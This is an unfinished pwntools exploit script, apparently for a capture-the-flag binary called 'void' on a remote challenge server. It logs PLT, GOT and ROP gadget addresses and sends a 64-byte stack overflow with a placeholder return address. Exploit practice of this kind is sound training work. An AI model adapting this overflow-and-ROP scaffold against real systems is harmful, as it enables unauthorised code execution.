#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host 178.62.64.13 --port 32039 void
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('void')
libc = ELF(exe.runpath + b'libc.so.6')
# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '178.62.64.13'
port = int(args.PORT or 32039)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)
# RUNPATH:  b'./glibc/'

io = start()

# shellcode = asm(shellcraft.sh())
# payload = fit({
#     32: 0xdeadbeef,
#     'iaaa': [1, 2, 'Hello', 3]
# }, length=128)
# io.send(payload)
# flag = io.recv(...)
# log.success(flag)
main_plt = exe.symbols['main']
read_plt = exe.symbols['read']
read_got = exe.got['read']


log.info(f"main plt @ 0x{main_plt:02x}")
log.info(f"read plt @ 0x{read_plt:02x}")
log.info(f"read got @ 0x{read_got:02x}")

rop = rop.ROP(exe)
pop_rdi = rop.rdi.address
ret = rop.ret.address
log.info(f"pop_rdi  @ 0x{pop_rdi:02x}")
log.info(f"ret      @ 0x{ret:02x}")


offset = 64
overflow = b'A' * 64
ret_address = 0xdeadbeef
io.send(overflow  + b'BBBBBBBB' + p64(ret_address))


io.interactive()

